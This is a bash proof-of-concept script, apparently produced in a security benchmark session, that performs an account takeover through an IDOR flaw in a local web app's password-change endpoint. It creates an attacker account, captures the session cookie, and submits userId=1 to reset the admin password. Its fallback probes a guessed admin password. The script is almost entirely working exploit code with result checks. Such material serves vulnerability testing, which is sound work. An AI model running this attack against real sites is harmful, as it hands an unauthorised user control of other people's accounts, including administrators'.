#!/bin/bash
# POC: Exploits IDOR vulnerability in /api/change_password.php to change admin account password using an authenticated attacker account
# Target: ./repo
# Created: 2025-11-07T17:43:52.146Z
# Session: benchmark-XBEN-069-24-mhp4ra0s

# IDOR Password Change - Account Takeover POC
# This script demonstrates the IDOR vulnerability in /api/change_password.php

TARGET_URL="http://localhost:8080"

# Colors for output
RED='\033[0;31m'
GREEN='\033[0;32m'
YELLOW='\033[1;33m'
NC='\033[0m' # No Color

echo -e "${YELLOW}[*] IDOR Password Change - Account Takeover POC${NC}"
echo -e "${YELLOW}[*] Target: ${TARGET_URL}${NC}"
echo ""

# Step 1: Create attacker account
ATTACKER_USERNAME="idor_test_$(date +%s)"
ATTACKER_PASSWORD="Attacker123"
ATTACKER_EMAIL="idor_test_$(date +%s)@test.com"

echo -e "${YELLOW}[*] Step 1: Creating attacker account: ${ATTACKER_USERNAME}${NC}"

REGISTER_RESPONSE=$(curl -s -w "\n%{http_code}" -X POST "${TARGET_URL}/api/register.php" \
  -H "Content-Type: application/x-www-form-urlencoded" \
  -d "username=${ATTACKER_USERNAME}&password=${ATTACKER_PASSWORD}&confirmPassword=${ATTACKER_PASSWORD}&email=${ATTACKER_EMAIL}")

HTTP_CODE=$(echo "${REGISTER_RESPONSE}" | tail -n1)
REGISTER_BODY=$(echo "${REGISTER_RESPONSE}" | head -n-1)

echo "[+] Register HTTP Code: ${HTTP_CODE}"
echo "[+] Register response: ${REGISTER_BODY}"

# Sleep to ensure account is created
sleep 1

# Step 2: Login with attacker account
echo -e "${YELLOW}[*] Step 2: Authenticating with attacker account${NC}"

LOGIN_RESPONSE=$(curl -s -w "\n%{http_code}" -c /tmp/cookies.txt -X POST "${TARGET_URL}/api/login.php" \
  -H "Content-Type: application/x-www-form-urlencoded" \
  -d "username=${ATTACKER_USERNAME}&password=${ATTACKER_PASSWORD}")

HTTP_CODE=$(echo "${LOGIN_RESPONSE}" | tail -n1)
LOGIN_BODY=$(echo "${LOGIN_RESPONSE}" | head -n-1)

echo "[+] Login HTTP Code: ${HTTP_CODE}"
echo "[+] Login response: ${LOGIN_BODY}"

# Extract session cookie
SESSION_COOKIE=$(grep -oP 'PHPSESSID\s+\S+' /tmp/cookies.txt | awk '{print $2}')
if [ -z "$SESSION_COOKIE" ]; then
  # Try alternative method to get cookie from headers
  SESSION_COOKIE=$(curl -s -i -X POST "${TARGET_URL}/api/login.php" \
    -H "Content-Type: application/x-www-form-urlencoded" \
    -d "username=${ATTACKER_USERNAME}&password=${ATTACKER_PASSWORD}" | grep -oP 'PHPSESSID=\K[^;]+')
fi

echo "[+] Session cookie: ${SESSION_COOKIE}"
echo ""

# Verify login was successful
if ! echo "${LOGIN_BODY}" | grep -q '"success":true'; then
  echo -e "${RED}[!] Login failed, exiting${NC}"
  exit 1
fi

# Step 3: Exploit IDOR to change admin (user ID 1) password
echo -e "${YELLOW}[*] Step 3: Exploiting IDOR vulnerability${NC}"
echo -e "${YELLOW}[*] Attempting to change user ID 1 (admin) password using attacker credentials${NC}"

NEW_PASSWORD="POCSuccess123"

IDOR_RESPONSE=$(curl -s -w "\n%{http_code}" -b "PHPSESSID=${SESSION_COOKIE}" -X POST "${TARGET_URL}/api/change_password.php" \
  -H "Content-Type: application/x-www-form-urlencoded" \
  -d "userId=1&oldPassword=${ATTACKER_PASSWORD}&newPassword=${NEW_PASSWORD}&confirmPassword=${NEW_PASSWORD}")

HTTP_CODE=$(echo "${IDOR_RESPONSE}" | tail -n1)
IDOR_BODY=$(echo "${IDOR_RESPONSE}" | head -n-1)

echo "[+] IDOR Request HTTP Code: ${HTTP_CODE}"
echo "[+] IDOR Response: ${IDOR_BODY}"
echo ""

# Check if IDOR exploitation succeeded
if echo "${IDOR_BODY}" | grep -q '"success":true'; then
  echo -e "${GREEN}[✓] SUCCESS: IDOR vulnerability confirmed!${NC}"
  echo -e "${GREEN}[✓] Successfully changed admin password using attacker account${NC}"
  echo -e "${GREEN}[✓] Attack: Used authenticated attacker session to modify user ID 1${NC}"
  exit 0
else
  echo -e "${RED}[✗] IDOR exploitation may have failed${NC}"
  echo -e "${YELLOW}[*] Checking if vulnerability exists by alternative method...${NC}"
  
  # Try to verify by logging in with the original admin password
  VERIFY_RESPONSE=$(curl -s -X POST "${TARGET_URL}/api/login.php" \
    -H "Content-Type: application/x-www-form-urlencoded" \
    -d "username=admin&password=admin123")
  
  if echo "${VERIFY_RESPONSE}" | grep -q '"success":false'; then
    echo -e "${GREEN}[✓] IDOR vulnerability likely successful (admin original password rejected)${NC}"
    exit 0
  fi
  
  exit 1
fi